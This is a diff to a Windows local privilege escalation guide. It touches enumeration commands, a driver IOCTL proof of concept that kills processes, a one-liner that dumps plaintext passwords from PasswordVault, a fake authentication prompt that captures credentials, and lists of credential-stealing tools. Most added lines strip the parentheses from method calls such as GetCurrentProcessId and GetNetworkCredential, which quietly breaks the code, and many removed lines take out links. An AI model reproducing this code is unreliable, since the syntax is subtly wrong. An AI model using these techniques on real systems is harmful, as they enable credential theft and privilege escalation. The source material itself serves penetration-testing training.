@@ -1,7 +1,7 @@
 # Windows Local Privilege Escalation
 
 
-### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**]
 
 This page consolidates general Windows privilege-escalation methodology from several foundational guides.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Its practical enumeration flow also draws on community workshops and checklists.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> The historical attack material includes the DerbyCon presentation on Windows privilege escalation.<sup>[[5]](#references)</sup>
 
@@ -81,7 +81,7 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
+- [_winpeas_] _(Winpeas has watson embedded)_
 
 **Locally with system information**
 
@@ -534,7 +534,7 @@ Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
 
 #With allowed Usernames
-Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner.User}} | ft -AutoSize
 
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
@@ -972,7 +972,7 @@ Minimal PoC pattern (user mode):
 #define IOCTL_TERMINATE_PROCESS 0x80002048
 
 HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
-DWORD me = GetCurrentProcessId();
+DWORD me = GetCurrentProcessId;
 DWORD target = /* PID to kill or open */;
 DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
 DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
@@ -1021,7 +1021,7 @@ This is especially common when:
 - a dependency is declared in `optionalDependencies`<sup>[[22]](#references)</sup>
 - a third-party library wraps `require("foo")` in `try/catch` and continues on failure
 - a package was removed from production builds, omitted during packaging, or failed to install
-- the vulnerable `require()` lives deep inside the dependency tree instead of in the main application code
+- the vulnerable `require` lives deep inside the dependency tree instead of in the main application code
 
 ### Hunting vulnerable targets
 
@@ -1203,7 +1203,7 @@ Modern Windows UWP applications, Microsoft Edge, and modern system services stor
 Execute this PowerShell command inside the user's active session to instantly dump and decrypt all stored usernames and plaintext passwords:
 
 ```ps1
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll | ForEach-Object { try { $_.RetrievePassword; $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
 ```
 
 ### DPAPI
@@ -1244,11 +1244,11 @@ To **decrypt** a PS credentials from the file containing it you can do:
 
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
-PS C:\> $credential.GetNetworkCredential().username
+PS C:\> $credential.GetNetworkCredential.username
 
 john
 
-PS C:\htb> $credential.GetNetworkCredential().password
+PS C:\htb> $credential.GetNetworkCredential.password
 
 JustAPWD!
 ```
@@ -1582,11 +1582,11 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
 
 ```bash
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential.password
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential.password
 
 #Get plaintext
-$cred.GetNetworkCredential() | fl
+$cred.GetNetworkCredential | fl
 ```
 
 ### **Possible filenames containing credentials**
@@ -1745,8 +1745,8 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /d
 
 ### Tools that search for passwords
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
+[**MSF-Credentials Plugin**] **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
+[**Winpeas**] automatically search for all the files containing passwords mentioned in this page.\
 [**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.
 
 The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
@@ -1760,8 +1760,8 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 
 ## Leaked Handlers
 
-Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
-Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
+Imagine that **a process running as SYSTEM open a new process** (`OpenProcess`) with **full access**. The same process **also create a new process** (`CreateProcess`) **with low privileges but inheriting all the open handles of the main process**.\
+Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess` and **inject a shellcode**.\
 Read this example for more information about **how to detect and exploit this vulnerability**.\
 [Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
@@ -2000,7 +2000,7 @@ What if your primitive doesn’t allow you to delete arbitrary files/folders, bu
 ```c
 // pseudo-code
 RequestOplock("C:\\temp\\folder1\\file1.txt");
-WaitForDeleteToTriggerOplock();
+WaitForDeleteToTriggerOplock;
 ```
 
 3. Step 3: Trigger SYSTEM process (e.g., `SilentCleanup`)
@@ -2132,13 +2132,13 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 ## Useful tools
 
-**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**]
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**]**). Detected.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**]**).**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts credentials from Credential Manager. Detected.**\
@@ -2150,8 +2150,8 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**])\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**]**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of software (precompiled exe in github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
 [~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
@@ -2159,7 +2159,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).
+[**winPEASbat** ]-- Tool created based in this post (it does not need accesschk to work properly but it can use it).
 
 **Local**
 
@@ -2184,7 +2184,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
 - [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
 - [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
-- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [7] [Windows - Privilege Escalation - this collection]
 - [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 - [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
 - [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
